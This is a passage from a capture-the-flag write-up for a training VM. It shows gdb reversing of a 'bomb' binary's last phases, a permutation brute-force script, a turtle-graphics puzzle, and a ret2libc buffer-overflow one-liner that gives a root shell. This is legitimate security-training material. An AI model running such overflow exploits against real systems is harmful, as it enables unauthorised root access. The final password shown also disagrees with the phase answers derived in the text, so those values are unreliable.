   0x08048d87 <+91>:	call   0x80494fc <explode_bomb>
   0x08048d8c <+96>:	lea    esp,[ebp-0x18]
   0x08048d8f <+99>:	pop    ebx
   0x08048d90 <+100>:	pop    esi
   0x08048d91 <+101>:	mov    esp,ebp
   0x08048d93 <+103>:	pop    ebp
   0x08048d94 <+104>:	ret
End of assembler dump.
```

At first we got a `<string_lenght>` function call. The results get `cmp` with `0x6` which 6. So now we know that our string must be 6 long characteres.

The we have have a `and` instruction, between each character in our string and `0xf`. The result is the index of a character in this string : `0x804b220` which is :
```
(gdb) x/s 0x804b220
0x804b220 <array.123>:	 "isrveawhobpnutfg\260\001" //lets call it str for the sake of the exercise.
```

All of this is in a while, when its finished the result of that string is compared with this one `0x804980b` which is :
```
(gdb) x/s 0x804980b
0x804980b:	 "giants"
```

We have in the hints in `README` file that the first character is `o`. If we do a bitwise operation and, `o` in ascii is `0x6f`.
```
0x6f AND 0xf = 15
str[15] = 'g';
```

So we can continue the same way using only alphabets in the ascii table.
```
str[0] = 'i'; => the result of the AND operation should be 0 => 0x70('p') & 0xf = 0
str[5] = 'a'; => the result of the AND operation should be 5 => 0x75('u') & 0xf = 5
str[11] = 'n'; => the result of the AND operation should be 11 => 0x6b('k') & 0xf = 11
str[13] = 't'; => the result of the AND operation should be 13 => 0x6d('m') & 0xf = 13
str[1] = 's'; => the result of the AND operation should be 1 => 0x61('a') & 0xf = 1
```

Note: There's more than one way to solve this challenge we'll check all the possibilities later on if the password won't work.

So the final string we should input is : "opukma"

## Phase 6
In the last phase we are again invited to read 6 numbers. Basically it checks if all numbers are less or equal to 6 and distinct and do some other operations, We created a script in python which will do the permutations and at the end it turns out that the combination is 4 2 6 3 1 5
```
import os
import itertools

for c in itertools.permutations("12356"):
	perm_str = "4 {0} {1} {2} {3} {4}".format(*c)
	os.system('echo "'+perm_str+'" | cat input.txt -| ./bomb > /dev/null && echo "'+perm_str+'"')
```
```
laurie@BornToSecHackMe:~$ python last_bomb.py
4 2 6 3 1 5
laurie@BornToSecHackMe:~$
```

> **After finishing all steps the password is the concatenation of every step without spaces: Publicspeakingisveryeasy.126241207201b2149opekmq426135**

# Exploit user thor with SSH

Once connected we find instructions in a file named `turtle` that will give us password for user `zaz`.
We created a python script wich will follow the instructions:

![30](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/30.png)

we found that it draws letter which are `SLASH`, at the end of the instructions we have a message
`Can you digest the message? :)` which means that we have to apply `MD5` on that word. The password is `646da671ca01bb5d84dbb5fb2238dc8e`

# Exploit user zaz sith SSH

Once connected we find a folder named `mail` that contains empty folders and log messages with unreadable content, and a binary
named `exploit_me`. When running the binary wihtout arguments is does nothing but if we give an argument it prints it back.
Giving more arguments does not change things

First idea that cames in mind is to see if we can overflow the input, which happens when we give more than `139` characters. We can then
erase then call `system("/bin/sh")` with the following command:
```bash
$ ./exploit_me $(python -c "print('0' * 140 + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7')")
'\x58\xcc\xf8\xb7')"`
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000`��AAAAX��
# whoami
root
```

`'\x60\xb0\xe6\xb7'` is the address of `system` and `\x58\xcc\xf8\xb7'` is the address of `"/bin/sh"`

We can then go to root home directory and find a `README`:
```bash
# cd /root
# ls
README
# cat README
CONGRATULATIONS !!!!
To be continued...
```
